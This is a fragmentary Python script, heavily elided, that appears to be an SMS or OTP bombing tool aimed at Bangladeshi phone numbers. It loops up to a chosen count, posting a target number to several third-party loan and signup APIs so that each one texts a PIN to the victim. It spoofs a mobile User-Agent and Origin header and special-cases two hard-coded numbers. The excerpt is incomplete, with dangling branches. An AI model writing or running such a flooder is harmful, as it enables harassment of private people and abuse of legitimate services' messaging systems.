...
# writen With python
import os, time, json, sys, random, string, webbrowser, uuid, smtplib, base64
...
def sent_pin(number, amount):
    ...
    while i < amount:
        ...
        try:
            ...
            data_hasebpati = '{"business_name":"SIAM","first_name":"Mr ","last_name":"Siam","phone_number":"'+ numberTwo + '"}'
...
def sent_pin_pre(number, amount,oparetor):
    ...
    while i < amount:
        ...
        try:
            url_call1 = "https://www.gntloanonline.online/api/bd_gntloanonline/s1818VYnIziUwS4?lang=en"
            headers_call1 = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "file://",
                "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; A5010 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 Html5Plus/1.0",
            ...
            data_call1 = "mobile=" + number + "&prefix=00880"
            resp_call1 = requests.post(url_call1, headers=headers_call1, data=data_call1)
            if i == amount:
                break
            else:
                pass
            ...
            if number in ['01843448308', '01832116637']:
                ...
                while i < amount:
                    try:
                        ...
                        data_1 = "mobile=" + number + "&prefix=00880"
                        resp_1 = requests.post(url_1, headers=headers_1, data=data_1)
                        lolcat(json.dumps(json.loads(resp_1.text), indent=1))
                        lolcat("TRY FROM GNT")
                        time.sleep(480)
                        if i == amount:
                            break
                    ...
                    try:
                        ...
                        lolcat(json.dumps(json.loads(resp_2.text), indent=1))
                        lolcat("TRY FROM ONLYIOU")
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
                    ...
                    try:
                        ...
                        lolcat(json.dumps(json.loads(resp_3.text), indent=1))
                        lolcat("TRY FROM PHANDORA")
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
                    ...
                    try:
                        ...
                        lolcat(json.dumps(json.loads(resp_4.text), indent=1))
                        lolcat("TRY FROM BILLEN")
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
